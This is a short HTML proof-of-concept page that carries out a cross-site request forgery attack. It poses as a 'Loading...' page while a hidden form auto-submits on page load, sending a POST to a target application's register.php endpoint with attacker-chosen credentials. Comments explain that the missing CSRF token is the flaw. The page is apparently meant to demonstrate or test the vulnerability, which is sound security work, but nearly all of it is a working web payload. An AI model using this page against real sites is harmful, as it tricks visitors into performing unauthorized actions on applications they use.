<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Loading...</h1>
    <p>Please wait while we process your request...</p>

    <!-- Hidden form that auto-submits to create a registration on the target application -->
    <form id="csrf_form" action="http://target-app/api/register.php" method="POST" style="display:none;">
        <input type="hidden" name="username" value="attacker_created_user">
        <input type="hidden" name="email" value="attacker@malicious.com">
        <input type="hidden" name="password" value="AttackerPassword123!">
        <!-- NO CSRF TOKEN - This is the vulnerability -->
    </form>

    <script>
        // Auto-submit the form when page loads
        // This simulates a CSRF attack where victim is tricked into visiting attacker's page
        document.getElementById('csrf_form').submit();
    </script>

    <p>Note: Since this form lacks a CSRF token, the request will be processed by /api/register.php</p>
    <p>The vulnerability allows account creation without user consent from malicious websites</p>
</body>
